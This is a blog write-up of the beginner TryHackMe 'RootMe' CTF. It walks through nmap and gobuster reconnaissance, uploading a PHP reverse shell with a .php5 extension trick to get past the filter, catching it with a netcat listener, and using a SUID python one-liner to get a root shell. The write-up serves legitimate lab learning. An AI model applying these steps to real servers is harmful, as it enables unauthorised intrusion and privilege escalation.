<!doctype html><html lang=en dir=auto><head><script src="/CCrashZer0/ccrashzer0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CCrashZer0/ccrashzer0.github.io/livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Root Me - CTF | CCrashZer0</title>
<meta name=keywords content="writeup,CTF"><meta name=description content="Try Hack Me - RootMe A ctf for beginners, can you root me? Reconnaissance Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.
nmap -sC -sV -T4 -A -oN nmap/result <IP> Breakdown:
-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal."><meta name=author content="CCrashZer0"><link rel=canonical href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/CCrashZer0/ccrashzer0.github.io/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/"><meta property="og:site_name" content="CCrashZer0"><meta property="og:title" content="Root Me - CTF"><meta property="og:description" content="Try Hack Me - RootMe A ctf for beginners, can you root me? Reconnaissance Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.
nmap -sC -sV -T4 -A -oN nmap/result <IP> Breakdown:
-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2021-02-12T00:00:00+00:00"><meta property="article:modified_time" content="2021-02-12T00:00:00+00:00"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="Root Me - CTF"><meta name=twitter:description content="Try Hack Me - RootMe A ctf for beginners, can you root me? Reconnaissance Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.
nmap -sC -sV -T4 -A -oN nmap/result <IP> Breakdown:
-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Docs","item":"http://localhost:1313/CCrashZer0/ccrashzer0.github.io/docs/"},{"@type":"ListItem","position":2,"name":"Root Me - CTF","item":"http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Root Me - CTF","name":"Root Me - CTF","description":"Try Hack Me - RootMe A ctf for beginners, can you root me? Reconnaissance Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.\nnmap -sC -sV -T4 -A -oN nmap/result \u0026lt;IP\u0026gt; Breakdown:\n-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal.","keywords":["writeup","CTF"],"articleBody":"Try Hack Me - RootMe A ctf for beginners, can you root me? Reconnaissance Scan the machine, how many ports are open? Here is the nmap scann commands that I am going to be using.\nnmap -sC -sV -T4 -A -oN nmap/result Breakdown:\n-A: do an extensive scan on these ports -sC: Scan with default NSE scripts. Considered useful for discovery and safe -sV: Attempts to determine the version of the service running on port -T4: speed of nmap scan is 4/5 (personal preference of mine) -oN: Normal output to the file normal.file What version of Apache is running? Let’s review out nmap scans and see if we are able to find what version of Apache we are running.\nHost is up (0.14s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA) | 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA) |_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HackIT - Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel What service is running on port 22? If you review the resutls fo the nmap scan you will see that there is a service running on port 22.\nFind directories on the web server using the GoBuster tool. We are going to run the following gobuster command to search for the hidden directory that they want us to find.\ngobuster dir -t 40 -u -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt Breakdown:\n-u: Full URL (including scheme), or base domain name. -t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10) -w: Path to the wordlist used for brute forcing (use – for stdin) What is the hidden directory? Do any of these directiores stand out!\n=============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http:/// [+] Threads: 40 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/11 19:14:32 Starting gobuster =============================================================== /uploads (Status: 301) /css (Status: 301) /js (Status: 301) /panel (Status: 301) Progress: 23943 / 220561 (10.86%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/02/11 19:15:44 Finished =============================================================== Getting a shell Find a form to upload and get a reverse shell, and find the flag. In out last question we found a hidden directory. Let’s open up our browser and got the following http:\\\\\\uploads Now lets try and upload a php reverse shell.\nPentest Monkey is a great resourse for us to use. Now that we have our reverse shell let’s add the ip address of our device into it and pick out a port we want to listen in on. Ok, lets try and upload our reverse shell… It looks like are now able to upload our file. How about we change the extention from PHP to PHP5 and then try again. How about them apples, it uploaded. Before we try and excute our payload lets set up a netcat listener. nc -nlvp Once our listener has been set up lets pull the trigger on our reverse shell and see if a connection can be made. BOOM!! We have a connection. The next thing we need to do is find the user.txt file. I tried looking in all the stander places like the current user directory and in the home directory but I did not have any luck. So I decided to use the find command find / -type f -name user.txt 2\u003e /dev/null With this command I was able to locate where our user.txt file is. Now all we need to do is cat out the content of our user.txt file and we will have our flag. Breakdown:\n* -type f – you are telling find to look exclusively for files * -name user.txt – instructing the find command to search for a file with the name “user.txt” * 2\u003e /dev/null – so error messages do not show up as part of the search result Privilege escalation Search for files with SUID permission, which file is weird? Again here we are going to be using the find command to help us locate our file with a weird SUID permission. find / -type f -user root -perm -u=s 2\u003e /dev/null_** Now how can use leverage this what we have found to escalate out privileges to a root shell. GTFO Bins is another great resourse that we can use. Let’s head over there and look up the SUID for python. It seems that we are that we are able to use the code below to gain a root shell.\n./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' root.txt One we have verified that we are actually running as root we will just need to cat out the content of out root.txt file. cat /root/root.txt Congratulations you have just completed the RootMe challenge from TryHackMe! ","wordCount":"819","inLanguage":"en","datePublished":"2021-02-12T00:00:00Z","dateModified":"2021-02-12T00:00:00Z","author":{"@type":"Person","name":"CCrashZer0"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/"},"publisher":{"@type":"Organization","name":"CCrashZer0","logo":{"@type":"ImageObject","url":"http://localhost:1313/CCrashZer0/ccrashzer0.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/about/ title=about><span>about</span></a></li><li><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/ title=blog><span class=active>blog</span></a></li><li><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/docs/>Docs</a></div><h1 class="post-title entry-hint-parent">Root Me - CTF</h1><div class=post-meta><span title='2021-02-12 00:00:00 +0000 UTC'>February 12, 2021</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;819 words&nbsp;·&nbsp;CCrashZer0</div></header><div class=post-content><h1 id=try-hack-me---rootme>Try Hack Me - RootMe<a hidden class=anchor aria-hidden=true href=#try-hack-me---rootme>#</a></h1><h2 id=br>A ctf for beginners, can you root me?</h2><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><ol><li><p>Scan the machine, how many ports are open?
Here is the nmap scann commands that I am going to be using.</p><pre tabindex=0><code>nmap -sC -sV -T4 -A -oN nmap/result &lt;IP&gt;
</code></pre><p>Breakdown:</p><pre tabindex=0><code>-A: do an extensive scan on these ports

-sC: Scan with default NSE scripts. Considered useful for discovery and safe

-sV: Attempts to determine the version of the service running on port

-T4: speed of nmap scan is 4/5 (personal preference of mine)

-oN: Normal output to the file normal.file
</code></pre></li><li><p>What version of Apache is running?
Let&rsquo;s review out nmap scans and see if we are able to find what version of Apache we are running.</p><pre tabindex=0><code>Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></li><li><p>What service is running on port 22?
If you review the resutls fo the nmap scan you will see that there is a service running on port 22.</p></li><li><p>Find directories on the web server using the GoBuster tool.
We are going to run the following gobuster command to search for the hidden directory that they want us to find.</p><pre tabindex=0><code>gobuster dir -t 40 -u &lt;IP&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
</code></pre><p>Breakdown:</p><pre tabindex=0><code>-u: Full URL (including scheme), or base domain name.

-t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10)

-w: Path to the wordlist used for brute forcing (use – for stdin)
</code></pre></li><li><p>What is the hidden directory?
Do any of these directiores stand out!</p><pre tabindex=0><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://&lt;IP&gt;/
[+] Threads:        40
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/11 19:14:32 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
Progress: 23943 / 220561 (10.86%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/02/11 19:15:44 Finished
===============================================================
</code></pre></li></ol><hr><h2 id=getting-a-shell>Getting a shell<a hidden class=anchor aria-hidden=true href=#getting-a-shell>#</a></h2><ol><li>Find a form to upload and get a reverse shell, and find the flag.
In out last question we found a hidden directory.
Let&rsquo;s open up our browser and got the following <code>http:\\&lt;IP>\uploads</code><figure><img loading=lazy src=/img/rootme/1.png width=200></figure>Now lets try and upload a php reverse shell.<br><a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>Pentest Monkey</a> is a great resourse for us to use.
Now that we have our reverse shell let&rsquo;s add the ip address of our device into it and pick out a port we want to listen in on.
Ok, lets try and upload our reverse shell&mldr; It looks like are now able to upload our file.<figure><img loading=lazy src=/img/rootme/2.png width=200></figure>How about we change the extention from PHP to PHP5 and then try again.
How about them apples, it uploaded.
Before we try and excute our payload lets set up a netcat listener.
<code>nc -nlvp &lt;port#></code>
Once our listener has been set up lets pull the trigger on our reverse shell and see if a connection can be made.<figure><img loading=lazy src=/img/rootme/3.png width=200></figure>BOOM!! We have a connection.
The next thing we need to do is find the user.txt file.
I tried looking in all the stander places like the current user directory and in the home directory but I did not have any luck.
So I decided to use the find command <code>find / -type f -name user.txt 2> /dev/null</code>
With this command I was able to locate where our user.txt file is.
Now all we need to do is cat out the content of our user.txt file and we will have our flag.</li></ol><p>Breakdown:</p><pre tabindex=0><code>* -type f – you are telling find to look exclusively for files
* -name user.txt – instructing the find command to search for a file with the name “user.txt”
* 2&gt; /dev/null – so error messages do not show up as part of the search result 
</code></pre><h2 id=privilege-escalation>Privilege escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><hr><ol><li>Search for files with SUID permission, which file is weird?
Again here we are going to be using the <code>find</code> command to help us locate our file with a weird SUID permission.</li></ol><pre tabindex=0><code>find / -type f -user root -perm -u=s 2&gt; /dev/null_**
</code></pre><p>Now how can use leverage this what we have found to escalate out privileges to a root shell.
<a href=https://gtfobins.github.io/gtfobins/python/#suid>GTFO Bins</a> is another great resourse that we can use.
Let&rsquo;s head over there and look up the SUID for python.
It seems that we are that we are able to use the code below to gain a root shell.</p><pre tabindex=0><code>./python -c &#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;
</code></pre><ol start=2><li>root.txt
One we have verified that we are actually running as root we will just need to cat out the content of out root.txt file.
<code>cat /root/root.txt</code></li></ol><h1 id=congratulations-you-have-just-completed-the-rootme-challenge-from-tryhackme>Congratulations you have just completed the RootMe challenge from TryHackMe!<a hidden class=anchor aria-hidden=true href=#congratulations-you-have-just-completed-the-rootme-challenge-from-tryhackme>#</a></h1></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tags/writeup/>Writeup</a></li><li><a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tags/ctf/>CTF</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/blog/><span class=title>« Prev</span><br><span>First Post</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/CCrashZer0/ccrashzer0.github.io/>CCrashZer0</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>